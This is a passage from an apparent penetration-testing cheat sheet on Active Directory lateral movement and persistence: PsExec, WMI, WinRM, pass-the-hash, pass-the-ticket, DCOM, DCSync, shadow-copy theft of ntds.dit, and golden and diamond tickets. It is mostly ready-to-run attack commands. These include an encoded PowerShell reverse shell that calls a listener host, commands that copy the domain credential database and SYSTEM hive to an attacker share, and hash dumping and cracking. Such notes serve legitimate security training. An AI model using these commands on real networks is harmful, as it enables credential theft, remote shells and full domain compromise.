- Creates and spawns a service on the remote host
- Runs the requested program/command as a child process of `psexesvc.exe`

Using Sysinternals PsExec for remote interactive session (from windows host):

```powershell
# interactive shell using sysinternals version of psexec
./PsExec64.exe -accepteula -i  \\VICTIM -u DOMAIN\ADMINUSER -p PASSWORD cmd
```

Using `impacket-psexec` from Kali, pass-the-hash is possible:

```sh
# spawns interactive shell as SYSTEM
impacket-psexec -hashes :NTHASH ADMINUSER@VICTIM_IP

# with password authentication:
impacket-psexec 'ADMINUSER:PASSWORD@VICTIM_IP'
```


### 5.3.2 WMI and WinRM on Active Directory

WMI and WinRM both require plaintext credentials when executed from Windows (hashes are sufficient from Linux with impacket), and they both allow running commands as an administrator on a remote machine.

*Windows Management Instrumentation (WMI)* is capable of creating processes via the `Create` method from the `Win32_Process` class. It communicates through *Remote Procedure Calls (RPC)* over port 135 for remote access. In order to create a process on the remote target via WMI, we need (plaintext credentials of a member of the *Administrators* local group. The nice thing about WMI for lateral movement is that UAC remote access restrictions don't apply for domain users on domain-joined machines, so we can leverage full privileges.

Abusing WMI for lateral movement (from Windows):

```powershell
# create remote process with legacy tool: wmic
wmic /node:VICTIM_IP /user:LOCALADMIN /password:PASSWORD process call create "calc.exe"

# create remote process with PowerShell's WMI
# variable declaration
$username = 'LOCALADMIN';
$password = 'PASSWORD';
$victim = 'VICTIM'
$lhost = 'LISTEN_IP'
$lport = 443
$revshell = '$client=New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String );$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
$b64cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($revshell));
$command = 'powershell -ep bypass -nop -w hidden -enc '+$b64cmd;
# requires PSCredential object to hold creds
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
# then create Common Information Model (CIM) session object with DCOM protocol
# (i.e. WMI session)
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName $victim -Credential $credential -SessionOption $options
# Invoke Create method of Win32_Process
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};
```

Using WMI from Kali, which allows pass-the-hash!

```sh
# spawns remote shell as admin user with pass-the-hash
impacket-wmiexec -hashes :NTHASH ADMINUSER@VICTIM_IP

# using password authentication
impacket-wmiexec 'ADMINUSER:PASSWORD@VICTIM_IP'
```

*Windows Remote Management (WinRM)* is an alternative to WMI for remote administration, which we can also abuse. The benefit is that we get the output of commands we run on the attacker's Windows machine, and we can even get an interactive PowerShell session directly through WinRM.

WinRM is the Microsoft version of the WS-Management protocol, and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP. For WinRM to work, you need plaintext credentials of a domain user who is a member of the Administrators or Remote Management Users group on the target host.

Abusing WinRM for lateral movement (from Windows host):

```powershell
# legacy Windows Remote Shell (winrs) tool:
winrs -r:VICTIM -u:ADMINUSER -p:PASSWORD  "cmd /c hostname & whoami"
# stdout of cmd is printed here!

# using PowerShell
# variable declaration
$victim = 'VICTIM';
$username = 'LOCALADMIN';
$password = 'PASSWORD';
# starts same as WMI, creating PSCredential object
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
# create WinRM sesson
New-PSSession -ComputerName $victim -Credential $credential
# interactive session
Enter-PSSession 1
# run specific remote commands
Invoke-Command -ComputerName $victim -Credential $Cred -ScriptBlock { cmd.exe }
```

Abusing WinRM from Kali (allows pass the hash):

```sh
# interactive shell as admin user using PtH
evil-winrm -i VICTIM_IP -u ADMINUSER -H NTHASH

# or with password auth
evil-winrm -i VICTIM_IP -u ADMINUSER -p PASSWORD
```


### 5.3.3 Overpass-the-Hash

Overpass-the-hash is when you use an NTLM (or AES256) hash to obtain a Kerberos TGT in an environment where NTLM authentication is not allowed. Once you have the impersonated-user's TGT, you can use all the Windows tools/services that rely on Kerberos in the context of that user (e.g. PsExec)

**NOTE**: Because Kerberos relies on domain names, you must use those for any commands instead of IP addresses (set your `/etc/hosts` file).

```powershell
# using mimikatz
privilege::debug

# grab hash:
sekurlsa::logonpasswords

# perform overpass-the-hash, starting powershell window as user
# alternatively, kick off reverse shell
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell

# in new powershell session, interact to get/cache TGT (and TGS):
net use \\VICTIM

# inspect that you have TGT now
klist

# ready to use this session with creds (see psexec cmd below)


# using Rubeus
# be sure to use format "corp.com" for DOMAIN
.\Rubeus.exe asktgt /domain:DOMAIN /user:USER /rc4:NTHASH /ptt


# now you can use PsExec in context of stolen user
.\PsExec.exe -accepteula \\VICTIM cmd
# note, the spawned shell will be under stolen user, not SYSTEM

# or maybe just list shares
net view \\VICTIM
dir \\VICTIM\SHARE
```

On Kali, use impacket:

```sh
# be sure to use format "corp.com" for DOMAIN
impacket-getTGT -dc-ip DC_IP DOMAIN/USERNAME -hashes :NTHASH # or -aesKey AESKEY
export KRB5CCNAME=$(pwd)/USERNAME.ccache
impacket-psexec -k -no-pass DOMAIN/USER@VICTIM_FQDN
# this spawned shell will (still) be SYSTEM
# when you can't resolve domain IPs, add -dc-ip DC_IP -target-ip VICTIM_IP

# if you get the error:
[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)
# check that the target IP is correct/matches the victim hostname

# USE THIS
# you can also do overpass-the-hash directly with one command:
impacket-psexec -k -hashes :NTLM DOMAIN/USER@VICTIM_FQDN
```


### 5.3.4 Pass-the-Ticket

In Pass-the-Ticket, you steal someone else's kerberos ticket from memory and use it to access resources you wouldn't be able to. Stealing a TGS ticket more versatile than a TGT because you can use it on other machines, not just the one you stole it from. This attack is similar to Overpass-the-hash, except you're skipping over the AS-REQ, straight to the part where you have a ticket in hand.

Acquiring tickets with mimikatz:

```powershell
# in mimikatz shell:
privilege::debug
sekurlsa::tickets /export
kerberos::ptt FILENAME.kirbi

# in cmd shell:
# list tickets (pick which ones you want to copy to other machine)
dir *.kirbi

# check you have the ticket in memory
klist

# then use the permissions granted by the ticket (e.g. list files in share)
ls \\VICTIM\SHARE
```

Acquiring tickets with Rubeus:

```powershell
# from elevated cmd prompt
# list all tickets in memory
.\Rubeus.exe triage

# dump desired tickets (base64 encoded .kirbi printed to stdout)
.\Rubeus.exe dump /nowrap [/luid:LOGINID] [/user:USER] [/service:krbtgt]

# load the ticket into session (copy and paste base64 kirbi data from previous)
.\Rubeus.exe ptt /ticket:BASE64_KIRBI
```

Using saved tickets from Kali:

```sh
# if you have base64 ticket from Rubeus, convert to .kirbi first
echo -n "BASE64_KIRBI" | base64 -d > USERNAME.kirbi

# convert .kirbi to .ccache
impacket-ticketConverter USERNAME.kirbi USERNAME.ccache

# export path to .ccache to use with other tools
export KRB5CCNAME=$(pwd)/USERNAME.ccache

# use with crackmapexec, impacket-psexec/wmiexec/smbexec
# make sure you set /etc/hosts to reslove FQDN for crackmapexec
crackmapexec smb --use-kcache VICTIM_FQDN
impacket-psexec -k -no-pass VICTIM_FQDN
```


### 5.3.5 DCOM

Detailed first writeup by [cybereason](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)

Microsoft's *Component Object Model (COM)* allows software interaction between processes, and _Distributed Component Object Model (DCOM)_ extends COM to allow process interaction on remote hosts.

Both COM and DCOM are very old technologies dating back to the very first editions of Windows. Interaction with DCOM is performed over RPC on TCP port 135 and local **administrator access is required** to call the DCOM Service Control Manager, which is essentially an API.

The following DCOM lateral movement technique is based on the *Microsoft Management Console (MMC)* COM application that is employed for scripted automation of Windows systems. The MMC Application Class allows the creation of Application Objects, which expose the `ExecuteShellCommand` method under the `Document.ActiveView` property. This method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.

Leveraging DCOM to get a reverse shell on a remote machine:

```powershell
# variable declaration
$victim = 'VICTIM' # hostname or IP
$lhost = 'LISTEN_IP'
$lport = 443
$revshell = '$client=New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String );$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
$b64cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($revshell));
$command = 'powershell -ep bypass -nop -w hidden -enc '+$b64cmd;
# create the DCOM MMC object for the remote machine
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1",$victim))
# execute shell command through DCOM object
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,$command,"7")
# ExecuteShellCommand accepts 4 parameters:
# Command, Directory, Parameters, and WindowState (7 is hidden).
```


## 5.4 Active Directory Persistence

### 5.4.1 Domain Controller Synchronization (DCSync)

DCSync lets you remotely dump the hashes from a domain controller's `ntds.dit` file.

When multiple DCs are in use for redundancy, AD uses the Directory Replication Service (DRS) Remote Protocol to replicate (synchronize) these redundant DCs (e.g. using `IDL_DRSGetNCChanges` API). The DC receiving the sync request does not check that the request came from a known DC, only that the SID making the request has appropriate privileges.

To launch such a replication, a user needs to have the *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned. If we get access to any user account with these rights, we can impersonate a DC and perform the DCsync attack. The end result is the target DC will send the attacker copies of any data he requests.

Performing dcsync attack:

```powershell
# From inside mimikatz shell
# grab all hashes from DC
lsadump::dcsync
# grab hashes of specific user
lsadump::dcsync /user:corp\Administrator

# Kali: use impacket
# full dump of hashes
# you can use '-hashes LMHASH:NTHASH' for auth instead of password (or omit LMHASH)
impacket-secretsdump -just-dc -outputfile dcsync DOMAIN/ADMINUSER:PASSWORD@DC_IP
# grab specific user's hashes
impacket-secretsdump -just-dc-user -outputfile dcsync USER DOMAIN/ADMINUSER:PASSWORD@DC_IP
```

Crack dumped NTLM hashes:

```sh
❯ hashcat -m 1000 -w3 --force -r /usr/share/hashcat/rules/best64.rule --user dcsync.ntds /usr/share/wordlists/rockyou.txt
```


### 5.4.2 Volume Shadow Copy

Domain Admins can abuse shadow copies to obtain a copy of the `ntds.dit` file (the Active Directory database, containing all user credentials).

A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes. Shadow copies are managed by the binary `vshadow.exe`, part of the Windows SDK. They can also be created using WMI.

```powershell
# from elevated terminal session:

# create volume shadow copy of C: drive
# -nw : no writers (to speed up creation)
# -p : store copy on disk
vshadow.exe -nw -p  C:
# pay attention to Shadow copy device name
# line under * SNAPSHOT ID = {UUID}
#    - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# create SMB session with hacker machine
net use \\ATTACKER_IP herpderp /user:derp

# copy the ntds.dit file over to attacker machine (must do in cmd, not PS)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit \\ATTACKER_IP\share\ntds.dit.bak

# save copy of SYSTEM registry hive onto attacker machine
# this contains the encryption keys for the ntds.dit file
reg.exe save hklm\system \\ATTACKER_IP\share\system.hiv

# on Kali, use secretsdump to extract hashes
impacket-secretsdump -ntds ntds.dit.bak -system system.hiv -outputfile ntds-dump LOCAL
```

Alternative ways to create shadow copies, plus ways of working with them:

```powershell
# create shadow copy with wmic:
wmic shadowcopy call create volume=c:\

# create with PowerShell
([WMICLASS]"root\cimv2:win32_shadowcopy").create("C:\","ClientAccessible")

# list all volume shadow copies for C: drive
vssadmin list shadows /for=C:

# list using Powershell (shows date created)
Get-CimInstance Win32_ShadowCopy | select Name,Caption,Description,ServiceMachine,InstallDate,ID,DeviceObject

# if you want to browse the files in the shadow copy, mount it:
# Note the trailing slash at the end of the shadow copy device name's path!
mklink /D C:\users\Public\stuff SHADOWCOPYDEVNAME\
```

`Secretsdump` also supports the VSS method directly:

```sh
# perform VSS technique all in one go using secretsdump (-use-vss flag)
impacket-secretsdump -use-vss -just-dc -outputfile ntds-dump DOMAIN/ADMINUSER:PASSWORD@DC_IP
```




### 5.4.3 Golden Ticket

A Golden Ticket is a forged TGT that grants the user full Domain Admin rights across the entire domain. It requires having access to the `krbtgt` account's password hash, which means we've either compromised a Domain Admin account or the Domain Controller machine directly. The `krbtgt` account's hash is what the KDC uses for signing (encrypting) TGTs in the AS-REP. It's special because it's never changed automatically.

Taking advantage of a Golden Ticket is a form of overpass-the-hash, using the `krbtgt` hash to forge a TGT directly instead of submitting an AS-REQ with a regular user's hash to get the DC to grant you a TGT.

Before starting, make sure you have the `krbtgt` hash. You can get this many ways, including running `lsadump::lsa` in mimikatz on the DC, performing a dcsync attack, etc. Additionally, you must use an existing username (as of July 2022), and not a phony one.

```powershell
# extract the Domain SID from the user's SID
# (remove the RID and keep the rest. RID is last set of numbers in SID)
whoami /user

# in mimikatz shell
privilege::debug
# remove all existing tickets, so they don't conflict with the one you're forging
kerberos::purge
# forge golden ticket, load into memory with /ptt
# note use of '/krbtgt:' to pass NTHASH instead of '/rc4:' - difference b/w silver
# use '/aes256:' for AES256 kerberos hash
kerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-.... /krbtgt:NTHASH /ptt
# start cmd shell with new ticket in its context
misc::cmd cmd

# alternatively, use Rubeus (/aes256: if desired)
.\Rubeus.exe golden /ptt /rc4:HASH /user:USERNAME /ldap [outfile:FILENAME]
# here's loading a saved ticket:
.\Rubeus.exe ptt /ticket:ticket.kirbi

# list tickets in memory, make sure its there
klist

# now use overpass-the-hash technique (full domain name required)
.\PsExec.exe \\dc1 cmd.exe
```

You can forge a Golden Ticket on Kali:

```sh
# look up domain SID
impacket-lookupsid DOMAIN/USER:PASSWORD@VICTIM

# use -aesKey for AES256 hashes
impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN USERNAME
export KRB5CCNAME=$(pwd)/USERNAME.ccache
impacket-psexec -k -no-pass DOMAIN/USERNAME@VICTIM
# be sure to use FQDNs. Pass -dc-ip and -target-ip if necessary to resolve FQDNs
```

Even better (more OPSEC savvy) is a *Diamond Ticket*, where you modify the fields of a legitimate TGT by decrypting it with the `krbtgt` hash, modify it as needed (e.g. add Domain Admin group membership) and re-encrypt it.

```powershell
# Get user RID
whoami /user

.\Rubeus.exe diamond /ptt /tgtdeleg /ticketuser:USERNAME /ticketuserid:USER_RID /groups:512 /krbkey:AES256_HASH
# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash. 
```
